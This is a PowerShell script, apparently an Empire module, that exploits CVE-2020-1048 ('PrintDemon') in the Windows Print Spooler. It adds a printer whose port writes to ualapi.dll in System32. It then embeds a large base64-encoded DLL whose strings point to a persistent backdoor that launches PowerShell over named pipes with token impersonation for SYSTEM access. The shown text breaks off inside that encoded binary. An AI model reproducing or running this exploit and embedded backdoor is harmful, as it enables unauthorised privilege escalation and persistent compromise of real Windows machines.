function Invoke-PrintDemon {
<#
    .SYNOPSIS

        This is an Empire launcher PoC using PrintDemon, the CVE-2020-1048
        is a privilege escalation vulnerability that allows a persistent
        threat through Windows Print Spooler. The vulnerability allows an
        unprivileged user to gain system-level privileges. Based on
        @ionescu007 PoC.

        Author: @hubbl3, @Cx01N
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .EXAMPLE

        PS> Invoke-PrintDemon 'vAG4AUAB1CsAJABLACkAKQB8AEkARQBYAA=='

    .LINK

        https://github.com/ionescu007/PrintDemo
        https://stackoverflow.com/questions/4442122/send-raw-zpl-to-zebra-printer-via-usb
        https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1048
#>
param(
     [Parameter()]
     [string]$LauncherCode
 )
$LauncherCode =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($LauncherCode))

Add-PrinterDriver -Name "Generic / Text Only"
Add-PrinterPort -Name "C:\Windows\system32\ualapi.dll"
Add-Printer -Name "PrintDemon" -DriverName "Generic / Text Only" -PortName "C:\Windows\System32\Ualapi.dll"


$Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
);

$MethodDefinition = @"
    using System;
    using System.IO;
    using System.Runtime.InteropServices;

    namespace Printer {

        public class RawPrinterHelper
        {
            // Structure and API declarions:
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
            public class DOCINFOA
            {
                [MarshalAs(UnmanagedType.LPStr)]
                public string pDocName;
                [MarshalAs(UnmanagedType.LPStr)]
                public string pOutputFile;
                [MarshalAs(UnmanagedType.LPStr)]
                public string pDataType;
            }
            [DllImport("winspool.Drv", EntryPoint = "OpenPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool OpenPrinter([MarshalAs(UnmanagedType.LPStr)] string szPrinter, out IntPtr hPrinter, IntPtr pd);

            [DllImport("winspool.Drv", EntryPoint = "ClosePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool ClosePrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "StartDocPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool StartDocPrinter(IntPtr hPrinter, Int32 level, [In, MarshalAs(UnmanagedType.LPStruct)] DOCINFOA di);

            [DllImport("winspool.Drv", EntryPoint = "EndDocPrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool EndDocPrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "StartPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool StartPagePrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "EndPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool EndPagePrinter(IntPtr hPrinter);

            [DllImport("winspool.Drv", EntryPoint = "WritePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool WritePrinter(IntPtr hPrinter, IntPtr pBytes, Int32 dwCount, out Int32 dwWritten);

            // SendBytesToPrinter()
            // When the function is given a printer name and an unmanaged array
            // of bytes, the function sends those bytes to the print queue.
            // Returns true on success, false on failure.
            public static bool SendBytesToPrinter(string szPrinterName, IntPtr pBytes, Int32 dwCount)
            {
                Int32 dwError = 0, dwWritten = 0;
                IntPtr hPrinter = new IntPtr(0);
                DOCINFOA di = new DOCINFOA();
                bool bSuccess = false; // Assume failure unless you specifically succeed.

                di.pDocName = "My C#.NET RAW Document";
                di.pDataType = "RAW";

                // Open the printer.
                if (OpenPrinter(szPrinterName.Normalize(), out hPrinter, IntPtr.Zero))
                {
                    // Start a document.
                    if (StartDocPrinter(hPrinter, 1, di))
                    {
                        // Start a page.
                        if (StartPagePrinter(hPrinter))
                        {
                            // Write your bytes.
                            bSuccess = WritePrinter(hPrinter, pBytes, dwCount, out dwWritten);
                            EndPagePrinter(hPrinter);
                        }
                        EndDocPrinter(hPrinter);
                    }
                    ClosePrinter(hPrinter);
                }
                // If you did not succeed, GetLastError may give more information
                // about why not.
                if (bSuccess == false)
                {
                    dwError = Marshal.GetLastWin32Error();
                }
                return bSuccess;
            }

            public static bool SendFileToPrinter(string szPrinterName, string szFileName)
            {
                // Open the file.
                FileStream fs = new FileStream(szFileName, FileMode.Open);
                // Create a BinaryReader on the file.
                BinaryReader br = new BinaryReader(fs);
                // Dim an array of bytes big enough to hold the file's contents.
                Byte[] bytes = new Byte[fs.Length];
                bool bSuccess = false;
                // Your unmanaged pointer.
                IntPtr pUnmanagedBytes = new IntPtr(0);
                int nLength;

                nLength = Convert.ToInt32(fs.Length);
                // Read the contents of the file into the array.
                bytes = br.ReadBytes(nLength);
                // Allocate some unmanaged memory for those bytes.
                pUnmanagedBytes = Marshal.AllocCoTaskMem(nLength);
                // Copy the managed byte array into the unmanaged array.
                Marshal.Copy(bytes, 0, pUnmanagedBytes, nLength);
                // Send the unmanaged bytes to the printer.
                bSuccess = SendBytesToPrinter(szPrinterName, pUnmanagedBytes, nLength);
                // Free the unmanaged memory that you allocated earlier.
                Marshal.FreeCoTaskMem(pUnmanagedBytes);
                return bSuccess;
            }
        }
    }
"@;
Add-Type -ReferencedAssemblies $Ref -TypeDefinition $MethodDefinition -Language CSharp;
$PE =  [System.Convert]::FromBase64String('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AAAAAL48AAAAAAAA1DwAAAAAAAACPgAAAAAAAAw9AAAAAAAAHj0AAAAAAAAsPQAAAAAAAEo9AAAAAAAAWj0AAAAAAAB2PQAAAAAAAIo9AAAAAAAAmD0AAAAAAAC4PQAAAAAAAMQ9AAAAAAAA2D0AAAAAAADwPQAAAAAAAPY8AAAAAAAAAAAAAAAAAAACAAAAAAAAgPI6AAAAAAAA5joAAAAAAAACOwAAAAAAAA0AAAAAAACA2DoAAAAAAABzAAAAAAAAgMg6AAAAAAAAAwAAAAAAAIBvAAAAAAAAgAAAAAAAAAAAhjsAAAAAAABsOwAAAAAAAFg7AAAAAAAAUD8AAAAAAAAsOwAAAAAAAB47AAAAAAAASDsAAAAAAAAAAAAAAAAAAAcAR2V0QWRkckluZm9XAABXAFdTQVNvY2tldFcAADoAV1NBSW9jdGwAAAkAR2V0TmFtZUluZm9XAAACAEZyZWVBZGRySW5mb1cAV1MyXzMyLmRsbAAAIwBEYmdQcmludEV4AADWAU50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MA5AFOdFF1ZXJ5T2JqZWN0AOsCUnRsQ2FwdHVyZUNvbnRleHQA0wRSdGxMb29rdXBGdW5jdGlvbkVudHJ5AAD8BVJ0bFZpcnR1YWxVbndpbmQAAG50ZGxsLmRsbAB4BFJlYWRGaWxlAACUAENsb3NlVGhyZWFkcG9vbFdvcmsAjgBDbG9zZVRocmVhZHBvb2wAkwVTdGFydFRocmVhZHBvb2xJbwD1AENyZWF0ZVRocmVhZHBvb2wAAFQDSGVhcEZyZWUAAB8CR2V0Q3VycmVudFByb2Nlc3MAIwZXcml0ZUZpbGUA9wBDcmVhdGVUaHJlYWRwb29sSW8AAN4AQ3JlYXRlTmFtZWRQaXBlVwAAbQNJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QA6gVXYWl0Rm9yVGhyZWFkcG9vbElvQ2FsbGJhY2tzAADoBVdhaXRGb3JTaW5nbGVPYmplY3QAzQBDcmVhdGVGaWxlVwB2AENhbmNlbFRocmVhZHBvb2xJbwAA7QVXYWl0Rm9yVGhyZWFkcG9vbFdvcmtDYWxsYmFja3MAAHEAQ2FsbGJhY2tNYXlSdW5Mb25nAAAxAUR1cGxpY2F0ZUhhbmRsZQARBE9wZW5Qcm9jZXNzAI8AQ2xvc2VUaHJlYWRwb29sQ2xlYW51cEdyb3VwAGkCR2V0TGFzdEVycm9yAADLBVVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUAIwJHZXRDdXJyZW50VGhyZWFkAACIAENsb3NlSGFuZGxlAPYAQ3JlYXRlVGhyZWFkcG9vbENsZWFudXBHcm91cAAAUANIZWFwQWxsb2MAkQBDbG9zZVRocmVhZHBvb2xJbwCUBVN1Ym1pdFRocmVhZHBvb2xXb3JrAAC9AkdldFByb2Nlc3NIZWFwAADnAENyZWF0ZVByb2Nlc3NXAAD6AENyZWF0ZVRocmVhZHBvb2xXb3JrAAC+BVVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAAfQVTZXRVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAnAVUZXJtaW5hdGVQcm9jZXNzAABLRVJORUwzMi5kbGwAAHABR2V0VG9rZW5JbmZvcm1hdGlvbgBRAlF1ZXJ5U2VydmljZVN0YXR1c0V4AAAZAk9wZW5TZXJ2aWNlVwAA8wJTZXRUaHJlYWRUb2tlbgAAjAFJbXBlcnNvbmF0ZU5hbWVkUGlwZUNsaWVudAAAFQJPcGVuUHJvY2Vzc1Rva2VuAAAXAk9wZW5TQ01hbmFnZXJXAABlAENsb3NlU2VydmljZUhhbmR